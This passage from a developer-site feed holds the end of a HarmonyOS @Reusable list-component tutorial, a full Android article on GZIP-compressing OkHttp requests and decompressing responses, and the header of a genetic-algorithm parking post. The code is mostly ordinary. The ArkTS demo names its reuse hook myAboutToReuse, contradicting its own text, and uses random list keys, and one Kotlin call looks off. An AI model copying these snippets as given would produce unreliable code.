    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Reusable 组件演示'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">margin</span>(<span class="hljs-number">10</span>)

      <span class="hljs-title class_">List</span>() {
        <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span>, <span class="hljs-function">(<span class="hljs-params">item: ListItemParams</span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-comment">// 使用我们的复用组件</span>
            <span class="hljs-title class_">ReusableChild</span>({ <span class="hljs-attr">param</span>: item })
          }
        }, <span class="hljs-function">(<span class="hljs-params">item: ListItemParams</span>) =&gt;</span> item.<span class="hljs-property">content</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()) <span class="hljs-comment">// 唯一Key，避免使用index</span>
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'90%'</span>)
      .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>)
      .<span class="hljs-title function_">scrollBar</span>(<span class="hljs-title class_">BarState</span>.<span class="hljs-property">Off</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }
}

<span class="hljs-comment">// 核心重点：可复用组件</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableChild</span> {
  <span class="hljs-comment">// 使用 @Prop 装饰器来接收父组件传递的参数</span>
  <span class="hljs-meta">@Prop</span> <span class="hljs-attr">param</span>: <span class="hljs-title class_">ListItemParams</span>;

  <span class="hljs-comment">// 组件自己的状态</span>
  <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-attr">reuseCount</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;

  <span class="hljs-comment">/**
   * 生命周期：当组件从缓存池被重新拿出来复用时触发
   * 注意：ArkTS 中正确的复用生命周期是 aboutToReuse
   */</span>
  <span class="hljs-title function_">myAboutToReuse</span>(<span class="hljs-attr">param</span>: <span class="hljs-title class_">ListItemParams</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// 更新参数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">param</span> = param;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">reuseCount</span>++;

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`V哥：组件被复用了！复用次数: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.reuseCount}</span>`</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">param</span>.<span class="hljs-property">content</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Black</span>)
        .<span class="hljs-title function_">flexGrow</span>(<span class="hljs-number">1</span>)

      <span class="hljs-title class_">Blank</span>()

      <span class="hljs-title class_">Column</span>() {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'复用组件'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">10</span>)
          .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.reuseCount &gt; <span class="hljs-number">0</span> ? <span class="hljs-string">'已复用'</span> : <span class="hljs-string">'新建'</span>}</span>`</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">10</span>)
          .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">reuseCount</span> &gt; <span class="hljs-number">0</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>)
      }
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">param</span>.<span class="hljs-property">color</span>)
    .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">15</span> })
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
    .<span class="hljs-title function_">alignItems</span>(<span class="hljs-title class_">VerticalAlign</span>.<span class="hljs-property">Center</span>)
  }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a90986f72ebf4be69ddcfb71651ddf52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986607&amp;x-signature=rbsODjQytYypqauLYTOy4JVEZsU%3D" alt="" loading="lazy"/></p>
<p><strong>V 哥划重点：</strong></p>
<ol>
<li>加上 <code>@Reusable</code> 装饰符，你的组件就开启了“绿色环保”模式。</li>
<li>必须实现 <code>aboutToReuse</code> 方法。这是复用组件的灵魂，它决定了你把旧组件拿回来后，怎么给它“洗心革面”（更新数据）。</li>
<li>配合 LazyForEach 使用，那是绝配，性能起飞！</li>
</ol>
<hr/>
<h2 data-id="heading-12">V 哥总结一下</h2>
<p>兄弟们，API 21 的鸿蒙开发，其实就是在跟**“渲染”<strong>和</strong>“资源”**打交道。</p>
<ul>
<li><strong>长列表</strong>？上 <code>LazyForEach</code>，按需加载。</li>
<li><strong>重任务</strong>？上 <code>TaskPool</code>，后台多线程。</li>
<li><strong>组件多</strong>？上 <code>@Reusable</code>，回池复用。</li>
</ul>
<p>这三招你哪怕只学会了一招，你那个像“拖拉机”一样的 App 也能立马变“法拉利”。V 哥话就撂这儿了，代码都给你整理好了，直接去 DevEco Studio 6.0 里敲一遍，感受一下那种丝滑的快感！</p>
<p>我是 V 哥，咱们下期技术复盘见！别忘了给文章点个赞，这是 V 哥持续输出的动力！👋</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[android gzip数据压缩 笔记]]></title>    <link>https://juejin.cn/post/7594813727053889570</link>    <guid>https://juejin.cn/post/7594813727053889570</guid>    <pubDate>2026-01-14T09:07:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594813727053889570" data-draft-id="7594851429162221602" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="android gzip数据压缩 笔记"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-14T09:07:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="心源xinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            android gzip数据压缩 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    心源xinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:07:03.000Z" title="Wed Jan 14 2026 09:07:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Android 中进行 GZIP 数据压缩，主要涉及<strong>向服务器发送压缩数据</strong>和<strong>解压服务器返回的压缩数据</strong>两个场景。</p>
<p>以下是如何在客户端（Android）实现这两个关键操作的详细说明和代码示例。</p>
<h3 data-id="heading-0">一、发送数据：压缩请求体（POST/PUT等）</h3>
<p>当你需要向服务器发送大量文本数据（如 JSON）时，在客户端压缩可以显著减少上传流量。</p>
<p><strong>核心步骤：</strong></p>
<ol>
<li><strong>压缩数据</strong>：使用 <code>GZIPOutputStream</code> 将原始数据（如字符串）压缩为字节数组。</li>
<li><strong>设置请求头</strong>：在 HTTP 请求头中明确告诉服务器数据是经过 GZIP 压缩的，通常设置 <code>Content-Encoding: gzip</code>。</li>
<li><strong>发送二进制数据</strong>：将压缩后的字节数组作为请求体发送。</li>
</ol>
<p><strong>以下是使用 <code>OkHttp</code> 库发送 GZIP 压缩请求的推荐做法：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> okhttp3.*
<span class="hljs-keyword">import</span> okio.*
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream
<span class="hljs-keyword">import</span> java.util.zip.GZIPOutputStream

<span class="hljs-comment">// 1. 创建一个 OkHttpClient 实例</span>
<span class="hljs-keyword">val</span> client = OkHttpClient()

<span class="hljs-comment">// 2. 准备要发送的原始数据（例如一个 JSON 字符串）</span>
<span class="hljs-keyword">val</span> jsonString = <span class="hljs-string">"""{"name":"张三","age":25,"comment":"这是一个可能会很长的文本字段..."}"""</span>
<span class="hljs-keyword">val</span> requestBody = jsonString.toRequestBody(<span class="hljs-string">"application/json; charset=utf-8"</span>.toMediaType())

<span class="hljs-comment">// 3. 使用 GZIP 压缩请求体</span>
<span class="hljs-keyword">val</span> gzippedRequestBody = requestBody.gzip() <span class="hljs-comment">// 调用下面的扩展函数</span>

<span class="hljs-comment">// 4. 构建请求，并设置正确的请求头</span>
<span class="hljs-keyword">val</span> request = Request.Builder()
    .url(<span class="hljs-string">"https://your.api.com/endpoint"</span>)
    .post(gzippedRequestBody) <span class="hljs-comment">// 使用压缩后的请求体</span>
    .header(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"gzip"</span>) <span class="hljs-comment">// 关键：声明内容编码方式</span>
    .build()

<span class="hljs-comment">// 5. 发起异步请求</span>
client.newCall(request).enqueue(<span class="hljs-keyword">object</span> : Callback {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onFailure</span><span class="hljs-params">(call: <span class="hljs-type">Call</span>, e: <span class="hljs-type">IOException</span>)</span></span> {
        <span class="hljs-comment">// 处理网络失败</span>
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onResponse</span><span class="hljs-params">(call: <span class="hljs-type">Call</span>, response: <span class="hljs-type">Response</span>)</span></span> {
        <span class="hljs-comment">// 处理服务器响应</span>
    }
})

<span class="hljs-comment">// --- 关键：用于压缩 RequestBody 的 OkHttp 扩展函数 ---</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> RequestBody.<span class="hljs-title">gzip</span><span class="hljs-params">()</span></span>: RequestBody {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">object</span> : RequestBody() {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">contentType</span><span class="hljs-params">()</span></span>: MediaType? = <span class="hljs-keyword">this</span><span class="hljs-symbol">@gzip</span>.contentType()
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">contentLength</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Long</span> = -<span class="hljs-number">1</span> <span class="hljs-comment">// 压缩后长度未知，传递 -1</span>
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">writeTo</span><span class="hljs-params">(sink: <span class="hljs-type">BufferedSink</span>)</span></span> {
            <span class="hljs-comment">// 创建 GZIP 输出流，包装原始的 sink</span>
            <span class="hljs-keyword">val</span> gzipSink = GZIPOutputStream(sink.outputStream()).buffer()
            <span class="hljs-comment">// 将原始 RequestBody 的内容写入压缩流</span>
            <span class="hljs-keyword">this</span><span class="hljs-symbol">@gzip</span>.writeTo(gzipSink)
            gzipSink.close() <span class="hljs-comment">// 必须关闭 GZIP 流以写入尾部数据</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-1">二、接收数据：处理服务器返回的压缩响应（GET等）</h3>
<p>更常见的场景是，服务器返回了经过 GZIP 压缩的响应体（如 HTML、JSON），客户端需要正确解压。好消息是，<strong>现代网络库（如 OkHttp）通常会自动处理这个过程</strong>。</p>
<h4 data-id="heading-2">方式一：依赖网络库自动处理（推荐）</h4>
<p><strong>OkHttp、Retrofit 等库默认会自动处理 <code>Content-Encoding: gzip</code> 响应头，并对响应体进行透明解压。</strong> 你通常不需要手动写解压代码。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> client = OkHttpClient.Builder()
    .build() <span class="hljs-comment">// 默认已支持自动解压 GZIP 响应</span>

<span class="hljs-keyword">val</span> request = Request.Builder()
    .url(<span class="hljs-string">"https://api.example.com/data"</span>)
    .build()

client.newCall(request).enqueue(<span class="hljs-keyword">object</span> : Callback {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onResponse</span><span class="hljs-params">(call: <span class="hljs-type">Call</span>, response: <span class="hljs-type">Response</span>)</span></span> {
        <span class="hljs-comment">// OkHttp 已在此处自动解压，你直接拿到的是解压后的字符串</span>
        <span class="hljs-keyword">val</span> responseBodyString = response.body?.string()
        <span class="hljs-comment">// ... 处理数据</span>
    }
    <span class="hljs-comment">// ... onFailure</span>
})
</code></pre>
<h4 data-id="heading-3">方式二：手动解压字节数据（如需）</h4>
<p>如果你通过其他方式（如 <code>HttpURLConnection</code>）获得了原始的压缩字节流，可以手动解压。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream
<span class="hljs-keyword">import</span> java.util.zip.GZIPInputStream

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">decompressGzip</span><span class="hljs-params">(compressedBytes: <span class="hljs-type">ByteArray</span>)</span></span>: String {
    <span class="hljs-comment">// 使用 GZIPInputStream 包装压缩的字节输入流</span>
    ByteArrayInputStream(compressedBytes).use { bis -&gt;
        GZIPInputStream(bis).use { gzipIs -&gt;
            <span class="hljs-comment">// 读取解压后的数据</span>
            ByteArrayOutputStream().use { bos -&gt;
                <span class="hljs-keyword">val</span> buffer = ByteArray(<span class="hljs-number">1024</span>)
                <span class="hljs-keyword">var</span> len: <span class="hljs-built_in">Int</span>
                <span class="hljs-keyword">while</span> (gzipIs.read(buffer).also { len = it } != -<span class="hljs-number">1</span>) {
                    bos.write(buffer, <span class="hljs-number">0</span>, len)
                }
                <span class="hljs-comment">// 转换为字符串（假设是文本）</span>
                <span class="hljs-keyword">return</span> bos.toString(<span class="hljs-string">"UTF-8"</span>)
            }
        }
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-comment">// val compressedData: ByteArray = ... // 从网络获取的原始字节</span>
<span class="hljs-comment">// val originalString = decompressGzip(compressedData)</span>
</code></pre>
<h3 data-id="heading-4">三、关键实践要点与注意事项</h3>

























<table><thead><tr><th align="left">要点</th><th align="left">说明与建议</th></tr></thead><tbody><tr><td align="left"><strong>1. 服务器协同</strong></td><td align="left">发送时：服务器需能解析 <code>Content-Encoding: gzip</code> 请求头并自动解压。<br/>接收时：服务器需正确设置 <code>Content-Encoding: gzip</code> 响应头。</td></tr><tr><td align="left"><strong>2. 压缩收益</strong></td><td align="left"><strong>文本数据</strong>（JSON、XML、HTML）压缩效果极佳（可达70%+）。<br/><strong>已压缩格式</strong>（如图片JPEG/PNG、视频、已为.gz文件）再次压缩无效，反而增加开销。</td></tr><tr><td align="left"><strong>3. 性能权衡</strong></td><td align="left">压缩/解压消耗 <strong>CPU 资源</strong>，节省<strong>网络带宽和传输时间</strong>。在移动网络下，通常利远大于弊。这与<strong>耗电优化</strong>需权衡：密集压缩可能增加耗电，但大幅缩短了网络活跃时间，通常整体更省电。</td></tr><tr><td align="left"><strong>4. 测试验证</strong></td><td align="left"><strong>使用抓包工具</strong>（如 Charles、Fiddler）检查请求/响应头及原始数据大小，确认压缩生效。在代码中打印压缩前后数据长度进行对比。</td></tr></tbody></table>
<h3 data-id="heading-5">四、总结与最佳实践</h3>
<ol>
<li><strong>发送压缩请求</strong>：使用 OkHttp 等库的扩展功能，在发送前压缩请求体，并正确设置 <code>Content-Encoding: gzip</code> 头。</li>
<li><strong>接收压缩响应</strong>：<strong>优先依赖网络库的自动解压功能</strong>，无需手动实现。</li>
<li><strong>针对性压缩</strong>：主要对文本类 API 响应和请求进行压缩，避免对已压缩的二进制资源重复操作。</li>
<li><strong>全程监控</strong>：通过抓包工具验证压缩效果，确保服务器和客户端配置正确。</li>
</ol>
<p>将 GZIP 压缩与之前提到的<strong>网络请求合并、缓存策略、图片优化</strong>等手段结合，能全方位、有效地优化应用流量。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于遗传算法实现自动泊车+pygame可视化]]></title>    <link>https://juejin.cn/post/7595021077664956467</link>    <guid>https://juejin.cn/post/7595021077664956467</guid>    <pubDate>2026-01-14T08:08:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021077664956467" data-draft-id="7595030559563563059" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于遗传算法实现自动泊车+pygame可视化"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-14T08:08:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户137794049993"/> <meta itemprop="url" content="https://juejin.cn/user/3687102534924266"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于遗传算法实现自动泊车+pygame可视化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3687102534924266/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户137794049993
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:08:27.000Z" title="Wed Jan 14 2026 08:08:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 